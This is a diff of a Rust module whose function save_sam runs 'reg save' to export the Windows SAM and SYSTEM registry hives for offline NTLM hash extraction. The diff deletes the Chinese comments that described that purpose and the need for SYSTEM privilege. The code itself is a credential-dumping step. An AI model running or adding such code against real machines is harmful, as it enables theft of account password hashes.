@@ -1,6 +1,3 @@
-//! SAM 导出：reg save 转储 HKLM\SAM + HKLM\SYSTEM 配置单元，供离线解密
-//! （secretsdump 等工具提取 NTLM hash）。需要 SYSTEM 权限。
-
 use std::process::Command;
 
 fn run_reg_save(hive: &str, path: &str) -> bool {
@@ -11,7 +8,6 @@ fn run_reg_save(hive: &str, path: &str) -> bool {
         .unwrap_or(false)
 }
 
-/// 导出 SAM/SYSTEM 到 `out_dir`，返回 JSON。
 pub fn save_sam(out_dir: &str) -> String {
     let sam_path = format!("{}\\SAM", out_dir);
     let system_path = format!("{}\\SYSTEM", out_dir);
@@ -40,7 +36,6 @@ mod tests {
 
     #[test]
     fn save_returns_json_without_crash() {
-        // 普通权限下 reg save 会失败，验证失败路径不崩溃。
         let r = save_sam("C:\\Users\\Public");
         assert!(r.starts_with('{'), "expected JSON, got: {r}");
     }
